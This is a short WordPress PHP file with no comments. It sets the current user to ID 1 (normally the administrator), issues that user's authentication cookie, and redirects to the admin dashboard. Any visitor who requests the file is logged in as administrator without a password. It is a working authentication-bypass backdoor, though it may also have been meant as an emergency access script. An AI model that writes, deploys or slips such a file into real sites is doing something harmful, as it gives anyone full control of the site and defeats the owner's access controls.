<?php 
if(!isset($wpdb))
{
    require_once('wp-config.php');
    require_once('wp-includes/wp-db.php');
	
}

	wp_set_current_user(1);
	wp_set_auth_cookie(1);
	wp_redirect(site_url('wp-admin/'));
	exit;

?>